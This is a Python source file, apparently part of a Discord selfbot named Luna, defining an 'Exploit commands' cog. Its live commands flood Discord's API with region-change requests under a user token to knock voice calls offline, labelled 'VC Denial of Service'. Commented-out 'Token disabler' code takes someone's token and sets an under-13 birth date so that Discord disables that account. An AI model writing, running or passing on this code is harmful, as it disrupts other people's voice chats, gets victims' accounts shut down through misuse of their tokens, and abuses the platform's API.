import asyncio

from discord.ext import commands
from .utilities import *


class ExploitCog(commands.Cog, name="Exploit commands"):
    def __init__(self, bot: commands.bot):
        self.bot = bot

    @commands.command(
        name="dosvc",
        usage="<channel_id> [amount]",
        aliases=["dosvc1"],
        description="VC Denial of Service"
    )
    async def dosvc(self, luna, channel: discord.VoiceChannel, amount: int = 10):

        await message_builder(
            luna, title="VC Denial of Service", description=f"```\nSending Attack...```",
            delete_after=3
        )

        region = [
            'europe',
            'hongkong',
            'india',
            'russia',
            'brazil',
            'japan',
            'singapore',
            'southafrica',
            'sydney',
            'us-central',
            'us-east',
            'us-west',
            'us-south']

        for _ in range(amount):
            headers = {
                "Authorization": user_token,
                "Content-Type": "application/json",
                "Accept": "*/*",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
            }

            requests.patch(
                url=f"https://discord.com/api/{api_version}/channels/{str(channel.id)}/call",
                headers=headers,
                json={
                    'region': random.choice(region)
                }
            )
            await asyncio.sleep(0.5)

        await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```")

    @commands.command(
        name="dosvc2",
        usage="[amount]",
        description="VC Denial of Service"
    )
    async def dosvc2(self, luna, amount: int = 10):

        await message_builder(
            luna, title="VC Denial of Service", description=f"```\nSending Attack...```",
            delete_after=3
        )

        region = [
            'europe',
            'hongkong',
            'india',
            'russia',
            'brazil',
            'japan',
            'singapore',
            'southafrica',
            'sydney',
            'us-central',
            'us-east',
            'us-west',
            'us-south']

        for _ in range(amount):
            requests.patch(
                f'https://discord.com/api/{api_version}/guilds/{str(luna.guild.id)}',
                headers={
                    'Authorization': user_token
                },
                json={
                    'region': random.choice(region)
                }
            )
            await asyncio.sleep(0.5)

        await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```")


# @commands.command(name = "disabler",
# 				usage="<token>",
# 				aliases=["disabler1"],
# 				description = "Token disabler")
# async def disabler(self, luna, token:str):
#

# 	await message_builder(luna, title="Token Disabler", description=f"```\nAttempting to disable the token...```", delete_after=3)
# 	res = requests.patch('https://discord.com/api/{api_version}/guilds', headers={'Authorization': token}, json={'name': 'Luna Disabler'})
# await message_builder(luna, title="Token Disabler",
# description=f"```\n{res}``````json\nJSON\n\n{res.json()}```")

# @commands.command(name = "disabler2",
# 				usage="<token>",
# 				description = "Token disabler")
# async def disabler2(self, luna, token:str):
#

# await message_builder(luna, title="Token Disabler",
# description=f"```\nAttempting to disable the token...```",
# delete_after=3)

# 	DISABLED_MESSAGE = "You need to be 13 or older in order to use Discord."
# 	IMMUNE_MESSAGE = "You cannot update your date of birth."
# 	res = requests.patch('https://discord.com/api/{api_version}/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2017-2-11'})

# 	if res.status_code == 400:
# 		res_message = res.json().get('date_of_birth', ['no response message'])[0]

# 		if res_message == DISABLED_MESSAGE:
# await message_builder(luna, title="Token Disabler",
# description=f"```\nDisabled the token```")

# 		elif res_message == IMMUNE_MESSAGE:
# await message_builder(luna, title="Token Disabler",
# description=f"```\nThe provided token cannot be disabled```")

# 		else:
# 			await error_builder(luna, description=f"```\n{res_message}```")
# 	else:
# 		await error_builder(luna, description=f"```\nFailed to disable token```")